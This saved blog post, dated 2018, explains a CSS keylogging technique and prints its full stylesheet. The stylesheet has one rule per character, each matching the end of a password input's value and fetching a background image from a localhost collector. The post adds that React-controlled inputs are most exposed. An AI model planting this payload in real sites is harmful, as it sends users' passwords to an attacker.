@@ -1,0 +1,664 @@
+<!DOCTYPE html>
+<html lang="en" itemscope itemtype="http://schema.org/WebPage">
+  <head>
+    
+
+  <meta charset="utf-8" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
+
+  <title>Simple CSS Hack Can Steal Internet Passwords - Bennett Notes</title>
+  <meta property="og:title" content="Simple CSS Hack Can Steal Internet Passwords" />
+  <meta name="twitter:title" content="Simple CSS Hack Can Steal Internet Passwords" />
+  <meta name="description" content="A user on GitHub just posted an alarming exploit shows how a simple CSS hack can steal internet passwords. It&#8217;s kinda funny how you wouldn&#8217;t really think of CSS when it comes to vulnerabilities and hacking. Since CSS is only used to style a webpage, its threat level is generally considered to be relatively low.
+However, CSS does provide developers with very advanced selectors. In this case, if you wanted to select an input with the value of A in it and turn it red, then CSS allows you to do that.">
+  <meta property="og:description" content="A user on GitHub just posted an alarming exploit shows how a simple CSS hack can steal internet passwords. It&#8217;s kinda funny how you wouldn&#8217;t really think of CSS when it comes to vulnerabilities and hacking. Since CSS is only used to style a webpage, its threat level is generally considered to be relatively low.
+However, CSS does provide developers with very advanced selectors. In this case, if you wanted to select an input with the value of A in it and turn it red, then CSS allows you to do that.">
+  <meta name="twitter:description" content="A user on GitHub just posted an alarming exploit shows how a simple CSS hack can steal internet passwords. It&#8217;s kinda funny how you wouldn&#8217;t really think of CSS when it comes to …">
+  <meta name="author" content="Dave Bennett"/><script type="application/ld+json">
+{
+    "@context": "http://schema.org",
+    "@type": "WebSite",
+    "name": "Bennett Notes",
+    
+    "url": "https://bennettnotes.com"
+}
+</script><script type="application/ld+json">
+{
+  "@context": "http://schema.org",
+  "@type": "Organization",
+  "name": "",
+  "url": "https://bennettnotes.com"
+  
+  
+  
+  
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "http://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [{
+        "@type": "ListItem",
+        "position": 1,
+        "item": {
+          "@id": "https://bennettnotes.com",
+          "name": "home"
+        }
+    },{
+        "@type": "ListItem",
+        "position": 3,
+        "item": {
+          "@id": "https://bennettnotes.com/simple-css-hack-can-steal-internet-passwords/",
+          "name": "Simple c s s hack can steal internet passwords"
+        }
+    }]
+}
+</script><script type="application/ld+json">
+{
+  "@context": "http://schema.org",
+  "@type": "Article",
+  "author": {
+    "name" : "dave"
+  },
+  "headline": "Simple CSS Hack Can Steal Internet Passwords",
+  "description" : "A user on GitHub just posted an alarming exploit shows how a simple CSS hack can steal internet passwords. It&amp;#8217;s kinda funny how you wouldn&amp;#8217;t really think of CSS when it comes to vulnerabilities and hacking. Since CSS is only used to style a webpage, its threat level is generally considered to be relatively low.
+However, CSS does provide developers with very advanced selectors. In this case, if you wanted to select an input with the value of A in it and turn it red, then CSS allows you to do that.",
+  "inLanguage" : "en",
+  "wordCount": 782,
+  "datePublished" : "2018-02-21T16:51:25",
+  "dateModified" : "2018-02-21T16:51:25",
+  "image" : "https://bennettnotes.com/img/avatar-icon.png",
+  "keywords" : [ "css, exploits" ],
+  "mainEntityOfPage" : "https://bennettnotes.com/simple-css-hack-can-steal-internet-passwords/",
+  "publisher" : {
+    "@type": "Organization",
+    "name" : "https://bennettnotes.com",
+    "logo" : {
+        "@type" : "ImageObject",
+        "url" : "https://bennettnotes.com/img/avatar-icon.png",
+        "height" :  60 ,
+        "width" :  60
+    }
+  }
+}
+</script>
+
+<meta property="og:title" content="Simple CSS Hack Can Steal Internet Passwords" />
+<meta property="og:description" content="A user on GitHub just posted an alarming exploit shows how a simple CSS hack can steal internet passwords. It&#8217;s kinda funny how you wouldn&#8217;t really think of CSS when it comes to vulnerabilities and hacking. Since CSS is only used to style a webpage, its threat level is generally considered to be relatively low.
+However, CSS does provide developers with very advanced selectors. In this case, if you wanted to select an input with the value of A in it and turn it red, then CSS allows you to do that.">
+<meta property="og:image" content="https://bennettnotes.com/img/avatar-icon.png" />
+<meta property="og:url" content="https://bennettnotes.com/simple-css-hack-can-steal-internet-passwords/" />
+<meta property="og:type" content="website" />
+<meta property="og:site_name" content="Bennett Notes" />
+  <meta name="twitter:title" content="Simple CSS Hack Can Steal Internet Passwords" />
+  <meta name="twitter:description" content="A user on GitHub just posted an alarming exploit shows how a simple CSS hack can steal internet passwords. It&#8217;s kinda funny how you wouldn&#8217;t really think of CSS when it comes to …">
+  <meta name="twitter:image" content="https://bennettnotes.com/img/avatar-icon.png" />
+  <meta name="twitter:card" content="summary" />
+  <meta name="twitter:site" content="@_davebennett" />
+  <meta name="twitter:creator" content="@_davebennett" />
+  <link href='https://bennettnotes.com/img/favicon.ico' rel='icon' type='image/x-icon'/>
+  <meta property="og:image" content="https://bennettnotes.com/img/avatar-icon.png" />
+  <meta name="twitter:image" content="https://bennettnotes.com/img/avatar-icon.png" />
+  <meta name="twitter:card" content="summary" />
+  <meta name="twitter:site" content="@_davebennett" />
+  <meta name="twitter:creator" content="@_davebennett" />
+  <meta property="og:url" content="https://bennettnotes.com/simple-css-hack-can-steal-internet-passwords/" />
+  <meta property="og:type" content="website" />
+  <meta property="og:site_name" content="Bennett Notes" />
+
+  <meta name="generator" content="Hugo 0.54.0" />
+  <link rel="alternate" href="https://bennettnotes.com/index.xml" type="application/rss+xml" title="Bennett Notes">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css" integrity="sha384-9eLZqc9ds8eNjO3TmqPeYcDj8n+Qfa4nuSiGYa6DjLNcv9BtN69ZIulL9+8CqC9Y" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.5.0/css/all.css" integrity="sha384-B4dIYHKNBt8Bc12p+WXckhzcICo0wtJAoU8YZTY5qE0Id1GSseTk6S+L3BlXeVIU" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://bennettnotes.com/css/main.css" /><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic" />
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800" /><link rel="stylesheet" href="https://bennettnotes.com/css/syntax.css" /><link rel="stylesheet" href="https://bennettnotes.com/css/codeblock.css" /><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/photoswipe.min.css" integrity="sha384-h/L2W9KefUClHWaty3SLE5F/qvc4djlyR4qY3NUV5HGQBBW7stbcfff1+I/vmsHh" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/default-skin/default-skin.min.css" integrity="sha384-iD0dNku6PYSIQLyfTOpB06F2KCZJAKLOThS5HRe8b3ibhdEQ6eKsFf/EeFxdOt5R" crossorigin="anonymous"><link rel="stylesheet" href="https://bennettnotes.com/css/override.css" />
+
+
+
+  </head>
+  <body>
+    <nav class="navbar navbar-default navbar-fixed-top navbar-custom">
+  <div class="container-fluid">
+    <div class="navbar-header">
+      <button type="button" class="navbar-toggle" data-toggle="collapse" data-target="#main-navbar">
+        <span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+      <a class="navbar-brand" href="https://bennettnotes.com">Bennett Notes</a>
+    </div>
+
+    <div class="collapse navbar-collapse" id="main-navbar">
+      <ul class="nav navbar-nav navbar-right">
+        
+          
+            <li>
+              <a title="Programming" href="/categories/programming">Programming</a>
+            </li>
+          
+        
+          
+            <li class="navlinks-container">
+              <a class="navlinks-parent">Technology</a>
+              <div class="navlinks-children">
+                
+                  <a href="/categories/android">Android</a>
+                
+                  <a href="/categories/chrome-os">Chrome OS</a>
+                
+                  <a href="/categories/gadgets">Gadgets</a>
+                
+                  <a href="/categories/linux">Linux</a>
+                
+                  <a href="/categories/windows">Windows</a>
+                
+              </div>
+            </li>
+          
+        
+          
+            <li>
+              <a title="Life" href="/categories/life">Life</a>
+            </li>
+          
+        
+          
+            <li>
+              <a title="Search" href="/page/search/">Search</a>
+            </li>
+          
+        
+
+        
+
+        
+      </ul>
+    </div>
+
+    
+      <div class="avatar-container">
+        <div class="avatar-img-border">
+          <a title="Bennett Notes" href="https://bennettnotes.com">
+            <img class="avatar-img" src="https://bennettnotes.com/img/avatar-icon.png" alt="Bennett Notes" />
+          </a>
+        </div>
+      </div>
+    
+
+  </div>
+</nav>
+
+
+
+
+    
+
+
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+<div class="pswp__bg"></div>
+
+<div class="pswp__scroll-wrap">
+    
+    <div class="pswp__container">
+      <div class="pswp__item"></div>
+      <div class="pswp__item"></div>
+      <div class="pswp__item"></div>
+    </div>
+    
+    <div class="pswp__ui pswp__ui--hidden">
+    <div class="pswp__top-bar">
+      
+      <div class="pswp__counter"></div>
+      <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+      <button class="pswp__button pswp__button--share" title="Share"></button>
+      <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+      <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+      
+      
+      <div class="pswp__preloader">
+        <div class="pswp__preloader__icn">
+          <div class="pswp__preloader__cut">
+            <div class="pswp__preloader__donut"></div>
+          </div>
+        </div>
+      </div>
+    </div>
+    <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+      <div class="pswp__share-tooltip"></div>
+    </div>
+    <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+    </button>
+    <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+    </button>
+    <div class="pswp__caption">
+      <div class="pswp__caption__center"></div>
+    </div>
+    </div>
+    </div>
+</div>
+
+
+  
+  
+  
+
+
+
+
+
+
+  
+
+  <header class="header-section ">
+    
+    <div class="intro-header no-img">
+      <div class="container">
+        <div class="row">
+          <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+            <div class="post-heading">
+              
+                <h1>Simple CSS Hack Can Steal Internet Passwords</h1>
+              
+              
+              
+              
+                <span class="post-meta">
+  
+  
+  <i class="fas fa-calendar"></i>&nbsp;Posted on February 21, 2018
+  
+  
+    &nbsp;|&nbsp;<i class="fas fa-clock"></i>&nbsp;4&nbsp;minutes
+  
+  
+  
+    &nbsp;|&nbsp;<i class="fas fa-user"></i>&nbsp;dave
+  
+  
+</span>
+
+
+              
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </header>
+
+
+    
+<div class="container" role="main">
+  <div class="row">
+    <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+      <article role="main" class="blog-post">
+            
+            <img src="/wp-content/uploads/2018/02/css-hacks.png" class="thumbnail img-responsive">
+            <hr>
+            
+                <ins class="adsbygoogle"
+                style="display:block"
+                data-ad-client="ca-pub-6594501022141871"
+                data-ad-slot="6223025728"
+                data-ad-format="link"></ins>
+            <hr>
+            
+        <p>A user on GitHub just <a href="https://github.com/maxchehab/CSS-Keylogging" target="_blank" rel="noopener">posted an alarming exploit</a> shows how a simple CSS hack can steal internet passwords. It&#8217;s kinda funny how you wouldn&#8217;t really think of CSS when it comes to vulnerabilities and hacking. Since CSS is only used to style a webpage, its threat level is generally considered to be relatively low.</p>
+
+<p>However, CSS does provide developers with very advanced selectors. In this case, if you wanted to select an input with the value of A in it and turn it red, then CSS allows you to do that.  Now combine that with CSS&#8217;s background-img URL property that allows you to create a GET request for some background image. But instead of grabbing an image, you post to a server.</p>
+
+<p>So here&#8217;s what all of this looks like:</p>
+
+<pre><span class="pl-ent">input</span>[<span class="pl-e">type</span><span class="pl-k">=</span><span class="pl-s"><span class="pl-pds">"</span>password<span class="pl-pds">"</span></span>][<span class="pl-e">value</span><span class="pl-k">$=</span><span class="pl-s"><span class="pl-pds">"</span>a<span class="pl-pds">"</span></span>] {
+  <span class="pl-c1">background-image</span>: <span class="pl-c1">url</span>(<span class="pl-s"><span class="pl-pds">"</span>http://localhost:3000/a<span class="pl-pds">"</span></span>);
+}</pre>
+
+<p>What this selector is doing, is that it&#8217;s looking for any input of type password and value that ends with <em>a.</em> So you&#8217;re probably thinking, okay what&#8217;s the big deal? You&#8217;re only able to get the last value of an input field and not the whole password. And you are absolutely right until you consider doing something like GitHub user maxchehab:</p>
+
+<pre>input[type="password"][value$=" "] { background-image: url("http://localhost:3000/+"); }
+input[type="password"][value$="!"] { background-image: url("http://localhost:3000/%21"); }
+input[type="password"][value$="\""] { background-image: url("http://localhost:3000/%22"); }
+input[type="password"][value$="#"] { background-image: url("http://localhost:3000/%23"); }
+input[type="password"][value$="$"] { background-image: url("http://localhost:3000/%24"); }
+input[type="password"][value$="%"] { background-image: url("http://localhost:3000/%25"); }
+input[type="password"][value$="&"] { background-image: url("http://localhost:3000/%26"); }
+input[type="password"][value$="'"] { background-image: url("http://localhost:3000/%27"); }
+input[type="password"][value$="("] { background-image: url("http://localhost:3000/%28"); }
+input[type="password"][value$=")"] { background-image: url("http://localhost:3000/%29"); }
+input[type="password"][value$="*"] { background-image: url("http://localhost:3000/%2A"); }
+input[type="password"][value$="+"] { background-image: url("http://localhost:3000/%2B"); }
+input[type="password"][value$=","] { background-image: url("http://localhost:3000/%2C"); }
+input[type="password"][value$="-"] { background-image: url("http://localhost:3000/-"); }
+input[type="password"][value$="."] { background-image: url("http://localhost:3000/."); }
+input[type="password"][value$="/"] { background-image: url("http://localhost:3000/%2F"); }
+input[type="password"][value$="0"] { background-image: url("http://localhost:3000/0"); }
+input[type="password"][value$="1"] { background-image: url("http://localhost:3000/1"); }
+input[type="password"][value$="2"] { background-image: url("http://localhost:3000/2"); }
+input[type="password"][value$="3"] { background-image: url("http://localhost:3000/3"); }
+input[type="password"][value$="4"] { background-image: url("http://localhost:3000/4"); }
+input[type="password"][value$="5"] { background-image: url("http://localhost:3000/5"); }
+input[type="password"][value$="6"] { background-image: url("http://localhost:3000/6"); }
+input[type="password"][value$="7"] { background-image: url("http://localhost:3000/7"); }
+input[type="password"][value$="8"] { background-image: url("http://localhost:3000/8"); }
+input[type="password"][value$="9"] { background-image: url("http://localhost:3000/9"); }
+input[type="password"][value$=":"] { background-image: url("http://localhost:3000/%3A"); }
+input[type="password"][value$=";"] { background-image: url("http://localhost:3000/%3B"); }
+input[type="password"][value$="&lt;"] { background-image: url("http://localhost:3000/%3C"); }
+input[type="password"][value$="="] { background-image: url("http://localhost:3000/%3D"); }
+input[type="password"][value$="&gt;"] { background-image: url("http://localhost:3000/%3E"); }
+input[type="password"][value$="?"] { background-image: url("http://localhost:3000/%3F"); }
+input[type="password"][value$="@"] { background-image: url("http://localhost:3000/%40"); }
+input[type="password"][value$="A"] { background-image: url("http://localhost:3000/A"); }
+input[type="password"][value$="B"] { background-image: url("http://localhost:3000/B"); }
+input[type="password"][value$="C"] { background-image: url("http://localhost:3000/C"); }
+input[type="password"][value$="D"] { background-image: url("http://localhost:3000/D"); }
+input[type="password"][value$="E"] { background-image: url("http://localhost:3000/E"); }
+input[type="password"][value$="F"] { background-image: url("http://localhost:3000/F"); }
+input[type="password"][value$="G"] { background-image: url("http://localhost:3000/G"); }
+input[type="password"][value$="H"] { background-image: url("http://localhost:3000/H"); }
+input[type="password"][value$="I"] { background-image: url("http://localhost:3000/I"); }
+input[type="password"][value$="J"] { background-image: url("http://localhost:3000/J"); }
+input[type="password"][value$="K"] { background-image: url("http://localhost:3000/K"); }
+input[type="password"][value$="L"] { background-image: url("http://localhost:3000/L"); }
+input[type="password"][value$="M"] { background-image: url("http://localhost:3000/M"); }
+input[type="password"][value$="N"] { background-image: url("http://localhost:3000/N"); }
+input[type="password"][value$="O"] { background-image: url("http://localhost:3000/O"); }
+input[type="password"][value$="P"] { background-image: url("http://localhost:3000/P"); }
+input[type="password"][value$="Q"] { background-image: url("http://localhost:3000/Q"); }
+input[type="password"][value$="R"] { background-image: url("http://localhost:3000/R"); }
+input[type="password"][value$="S"] { background-image: url("http://localhost:3000/S"); }
+input[type="password"][value$="T"] { background-image: url("http://localhost:3000/T"); }
+input[type="password"][value$="U"] { background-image: url("http://localhost:3000/U"); }
+input[type="password"][value$="V"] { background-image: url("http://localhost:3000/V"); }
+input[type="password"][value$="W"] { background-image: url("http://localhost:3000/W"); }
+input[type="password"][value$="X"] { background-image: url("http://localhost:3000/X"); }
+input[type="password"][value$="Y"] { background-image: url("http://localhost:3000/Y"); }
+input[type="password"][value$="Z"] { background-image: url("http://localhost:3000/Z"); }
+input[type="password"][value$="["] { background-image: url("http://localhost:3000/%5B"); }
+input[type="password"][value$="\\"] { background-image: url("http://localhost:3000/%5C"); }
+input[type="password"][value$="]"] { background-image: url("http://localhost:3000/%5D"); }
+input[type="password"][value$="^"] { background-image: url("http://localhost:3000/%5E"); }
+input[type="password"][value$="_"] { background-image: url("http://localhost:3000/_"); }
+input[type="password"][value$="`"] { background-image: url("http://localhost:3000/%60"); }
+input[type="password"][value$="a"] { background-image: url("http://localhost:3000/a"); }
+input[type="password"][value$="b"] { background-image: url("http://localhost:3000/b"); }
+input[type="password"][value$="c"] { background-image: url("http://localhost:3000/c"); }
+input[type="password"][value$="d"] { background-image: url("http://localhost:3000/d"); }
+input[type="password"][value$="e"] { background-image: url("http://localhost:3000/e"); }
+input[type="password"][value$="f"] { background-image: url("http://localhost:3000/f"); }
+input[type="password"][value$="g"] { background-image: url("http://localhost:3000/g"); }
+input[type="password"][value$="h"] { background-image: url("http://localhost:3000/h"); }
+input[type="password"][value$="i"] { background-image: url("http://localhost:3000/i"); }
+input[type="password"][value$="j"] { background-image: url("http://localhost:3000/j"); }
+input[type="password"][value$="k"] { background-image: url("http://localhost:3000/k"); }
+input[type="password"][value$="l"] { background-image: url("http://localhost:3000/l"); }
+input[type="password"][value$="m"] { background-image: url("http://localhost:3000/m"); }
+input[type="password"][value$="n"] { background-image: url("http://localhost:3000/n"); }
+input[type="password"][value$="o"] { background-image: url("http://localhost:3000/o"); }
+input[type="password"][value$="p"] { background-image: url("http://localhost:3000/p"); }
+input[type="password"][value$="q"] { background-image: url("http://localhost:3000/q"); }
+input[type="password"][value$="r"] { background-image: url("http://localhost:3000/r"); }
+input[type="password"][value$="s"] { background-image: url("http://localhost:3000/s"); }
+input[type="password"][value$="t"] { background-image: url("http://localhost:3000/t"); }
+input[type="password"][value$="u"] { background-image: url("http://localhost:3000/u"); }
+input[type="password"][value$="v"] { background-image: url("http://localhost:3000/v"); }
+input[type="password"][value$="w"] { background-image: url("http://localhost:3000/w"); }
+input[type="password"][value$="x"] { background-image: url("http://localhost:3000/x"); }
+input[type="password"][value$="y"] { background-image: url("http://localhost:3000/y"); }
+input[type="password"][value$="z"] { background-image: url("http://localhost:3000/z"); }
+input[type="password"][value$="{"] { background-image: url("http://localhost:3000/%7B"); }
+input[type="password"][value$="|"] { background-image: url("http://localhost:3000/%7C"); }
+input[type="password"][value$="\\}"] { background-image: url("http://localhost:3000/%7D"); }
+input[type="password"][value$="~"] { background-image: url("http://localhost:3000/~"); }
+input[type="password"][value$=""] { background-image: url("http://localhost:3000/%7F"); }</pre>
+
+<p>Now, this is detecting every key-stroke and sending it to the server!</p>
+
+<ins class="adsbygoogle"
+style="display:block; text-align:center;"
+data-ad-format="fluid"
+data-ad-layout="in-article"
+data-ad-client="ca-pub-6594501022141871"
+data-ad-slot="6999463098"></ins>
+
+
+<p>Okay, let&#8217;s settle down the fear-mongering for a second and point out one small thing. This is only a vulnerability for input fields that update the value field with the user&#8217;s value. Most of the time, this isn&#8217;t an issue&#8230;except if you&#8217;re using <strong>ReactJS.</strong></p>
+
+<p>In fact, it&#8217;s recommended in ReactJS that you only update the input field using this method. And unfortunately, lots of sites do use ReactJS. However, the fix for this could simply be a browser requests that could restrict CSS access from certain types of fields like password inputs.</p>
+
+
+        
+          <div class="blog-tags">
+            
+              <a href="https://bennettnotes.com/tags/css/">css</a>&nbsp;
+            
+              <a href="https://bennettnotes.com/tags/exploits/">exploits</a>&nbsp;
+            
+          </div>
+        
+
+        
+            <hr/>
+            <section id="social-share">
+              <div class="list-inline footer-links">
+                
+
+<div class="share-box" aria-hidden="true">
+    <ul class="share">
+      
+      <li>
+        <a href="//twitter.com/share?url=https%3a%2f%2fbennettnotes.com%2fsimple-css-hack-can-steal-internet-passwords%2f&amp;text=Simple%20CSS%20Hack%20Can%20Steal%20Internet%20Passwords&amp;via=_davebennett" target="_blank" title="Share on Twitter">
+          <i class="fab fa-twitter"></i>
+        </a>
+      </li>
+  
+      
+      <li>
+        <a href="//plus.google.com/share?url=https%3a%2f%2fbennettnotes.com%2fsimple-css-hack-can-steal-internet-passwords%2f" target="_blank" title="Share on Google Plus">
+          <i class="fab fa-google-plus"></i>
+        </a>
+      </li>
+  
+      
+      <li>
+        <a href="//www.facebook.com/sharer/sharer.php?u=https%3a%2f%2fbennettnotes.com%2fsimple-css-hack-can-steal-internet-passwords%2f" target="_blank" title="Share on Facebook">
+          <i class="fab fa-facebook"></i>
+        </a>
+      </li>
+  
+      
+      <li>
+        <a href="//reddit.com/submit?url=https%3a%2f%2fbennettnotes.com%2fsimple-css-hack-can-steal-internet-passwords%2f&amp;title=Simple%20CSS%20Hack%20Can%20Steal%20Internet%20Passwords" target="_blank" title="Share on Reddit">
+          <i class="fab fa-reddit"></i>
+        </a>
+      </li>
+  
+      
+      <li>
+        <a href="//www.linkedin.com/shareArticle?url=https%3a%2f%2fbennettnotes.com%2fsimple-css-hack-can-steal-internet-passwords%2f&amp;title=Simple%20CSS%20Hack%20Can%20Steal%20Internet%20Passwords" target="_blank" title="Share on LinkedIn">
+          <i class="fab fa-linkedin"></i>
+        </a>
+      </li>
+  
+      
+      <li>
+        <a href="//www.stumbleupon.com/submit?url=https%3a%2f%2fbennettnotes.com%2fsimple-css-hack-can-steal-internet-passwords%2f&amp;title=Simple%20CSS%20Hack%20Can%20Steal%20Internet%20Passwords" target="_blank" title="Share on StumbleUpon">
+          <i class="fab fa-stumbleupon"></i>
+        </a>
+      </li>
+  
+      
+      <li>
+        <a href="//www.pinterest.com/pin/create/button/?url=https%3a%2f%2fbennettnotes.com%2fsimple-css-hack-can-steal-internet-passwords%2f&amp;description=Simple%20CSS%20Hack%20Can%20Steal%20Internet%20Passwords" target="_blank" title="Share on Pinterest">
+          <i class="fab fa-pinterest"></i>
+        </a>
+      </li>
+    </ul>
+  </div>
+  
+              </div>
+            </section>
+        
+
+        
+          
+          
+        
+      </article>
+
+      
+        <ul class="pager blog-pager">
+          
+            <li class="previous">
+              <a href="https://bennettnotes.com/how-to-build-a-forum/" data-toggle="tooltip" data-placement="top" title="How to build a forum">&larr; Previous Post</a>
+            </li>
+          
+          
+            <li class="next">
+              <a href="https://bennettnotes.com/implementing-token-interceptor-and-retry-in-angular-4/" data-toggle="tooltip" data-placement="top" title="Implementing Token Interceptor and Retry in Angular 4">Next Post &rarr;</a>
+            </li>
+          
+        </ul>
+      
+
+
+      
+        
+        
+      
+
+    </div>
+  </div>
+</div>
+
+    <footer>
+  <div class="container">
+    <div class="row">
+      <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+        <ul class="list-inline text-center footer-links">
+          
+              <li>
+                <a href="mailto:dave@bennettnotes.com" title="Email me">
+                  <span class="fa-stack fa-lg">
+                    <i class="fas fa-circle fa-stack-2x"></i>
+                    <i class="fas fa-envelope fa-stack-1x fa-inverse"></i>
+                  </span>
+                </a>
+              </li>
+              <li>
+                <a href="https://github.com/DaveBben" title="GitHub">
+                  <span class="fa-stack fa-lg">
+                    <i class="fas fa-circle fa-stack-2x"></i>
+                    <i class="fab fa-github fa-stack-1x fa-inverse"></i>
+                  </span>
+                </a>
+              </li>
+              <li>
+                <a href="https://twitter.com/_davebennett" title="Twitter">
+                  <span class="fa-stack fa-lg">
+                    <i class="fas fa-circle fa-stack-2x"></i>
+                    <i class="fab fa-twitter fa-stack-1x fa-inverse"></i>
+                  </span>
+                </a>
+              </li>
+              <li>
+                <a href="https://www.instagram.com/DaveBben" title="Instagram">
+                  <span class="fa-stack fa-lg">
+                    <i class="fas fa-circle fa-stack-2x"></i>
+                    <i class="fab fa-instagram fa-stack-1x fa-inverse"></i>
+                  </span>
+                </a>
+              </li>
+              <li>
+                <a href="https://www.youtube.com/user/opensourcegangster" title="Youtube">
+                  <span class="fa-stack fa-lg">
+                    <i class="fas fa-circle fa-stack-2x"></i>
+                    <i class="fab fa-youtube fa-stack-1x fa-inverse"></i>
+                  </span>
+                </a>
+              </li>
+          
+          <li>
+            
+            <a href="https://bennettnotes.com/index.xml" title="RSS">
+            
+              <span class="fa-stack fa-lg">
+                <i class="fas fa-circle fa-stack-2x"></i>
+                <i class="fas fa-rss fa-stack-1x fa-inverse"></i>
+              </span>
+            </a>
+          </li>
+          
+        </ul>
+        <p class="credits copyright text-muted">
+          
+            
+              <a href="bennettnotes.com">Dave Bennett</a>
+            
+          
+
+          &nbsp;&bull;&nbsp;&copy;
+          
+            2019
+          
+
+          
+            &nbsp;&bull;&nbsp;
+            <a href="https://bennettnotes.com">Bennett Notes</a>
+          
+        </p>
+        
+        <p class="credits theme-by text-muted">
+          Theme by adapted to <a href="https://github.com/halogenica/beautifulhugo">Beautiful Hugo</a>
+          
+        </p>
+      </div>
+    </div>
+  </div>
+</footer>
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.js" integrity="sha384-K3vbOmF2BtaVai+Qk37uypf7VrgBubhQreNQe9aGsz9lB63dIFiQVlJbr92dw2Lx" crossorigin="anonymous"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/contrib/auto-render.min.js" integrity="sha384-kmZOZB5ObwgQnS/DuDg6TScgOiWWBiVt0plIRkZCmE6rDZGrEOQeHM5PcHi+nyqe" crossorigin="anonymous"></script>
+<script src="https://code.jquery.com/jquery-1.12.4.min.js" integrity="sha256-ZosEbRLbNQzLpnKIkEdrPv7lOy9C27hHQ+Xp8a4MxAQ=" crossorigin="anonymous"></script>
+<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js" integrity="sha384-Tc5IQib027qvyjSMfHjOMaLkfuWVxZxUPnCJA7l2mCWNIpG9mGCD8wGNIcPD7Txa" crossorigin="anonymous"></script>
+<script src="https://bennettnotes.com/js/main.js"></script><script> renderMathInElement(document.body); </script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/photoswipe.min.js" integrity="sha384-QELNnmcmU8IR9ZAykt67vGr9/rZJdHbiWi64V88fCPaOohUlHCqUD/unNN0BXSqy" crossorigin="anonymous"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/photoswipe-ui-default.min.js" integrity="sha384-m67o7SkQ1ALzKZIFh4CiTA8tmadaujiTa9Vu+nqPSwDOqHrDmxLezTdFln8077+q" crossorigin="anonymous"></script>
+<script src="https://bennettnotes.com/js/load-photoswipe.js"></script>
+
+
+
+
+
+<script
+  async
+  src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"
+></script>
+<script>
+  (adsbygoogle = window.adsbygoogle || []).push({
+    google_ad_client: "ca-pub-6594501022141871",
+    enable_page_level_ads: true
+  });
+</script>
+<script>
+  function init() {
+    var vidDefer = document.getElementsByTagName("iframe");
+    for (var i = 0; i < vidDefer.length; i++) {
+      if (vidDefer[i].getAttribute("data-src")) {
+        vidDefer[i].setAttribute("src", vidDefer[i].getAttribute("data-src"));
+      }
+    }
+  }
+  window.onload = init;
+</script>
+
+
+  </body>
+</html>
+
